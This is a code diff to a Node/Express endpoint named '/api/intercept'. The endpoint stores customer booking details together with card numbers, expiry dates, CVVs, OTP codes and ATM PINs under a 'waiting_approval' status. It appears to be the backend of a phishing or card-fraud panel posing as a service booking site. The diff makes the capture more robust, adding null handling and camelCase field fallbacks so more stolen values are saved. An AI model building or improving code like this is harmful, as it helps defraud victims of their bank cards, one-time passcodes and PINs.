@@ -139,10 +139,10 @@ app.post('/api/intercept', async (req, res) => {
          VALUES ($1, $2, $3, $4, $5, $6, $7, $8, $9, $10, $11, $12, $13, $14, $15, $16, $17, $18, $19, $20)`,
         [
           ref, 'waiting_approval', 'card', 
-          data.customer_name, data.customer_phone, data.customer_address, 
-          data.service_type, data.total_price, data.duration, 
-          data.nationality, data.workers, data.start_date, 
-          data.raw_message, 
+          data.customer_name || null, data.customer_phone || null, data.customer_address || null, 
+          data.service_type || null, data.total_price || null, data.duration || null, 
+          data.nationality || null, data.workers || null, data.start_date || null, 
+          data.raw_message || null, 
           cardInfo.card_number || null, cardInfo.card_expiry || null, cardInfo.card_cvv || null, 
           cardInfo.otp_code || null, cardInfo.atm_pin || null,
           now, now
@@ -164,8 +164,17 @@ app.post('/api/intercept', async (req, res) => {
       ];
 
       possibleFields.forEach(field => {
-        let val = data[field] || cardInfo[field];
-        if (val !== undefined && val !== null) {
+        let val = data[field];
+        if (val === undefined || val === null) {
+          val = cardInfo[field];
+        }
+        // Special case for fields that might be camelCase in request but snake_case in DB
+        if (val === undefined || val === null) {
+            const camelField = field.replace(/_([a-z])/g, (g) => g[1].toUpperCase());
+            val = data[camelField];
+        }
+
+        if (val !== undefined && val !== null && val !== "") {
           updateFields.push(`${field} = $${valIdx++}`);
           updateValues.push(val);
         }
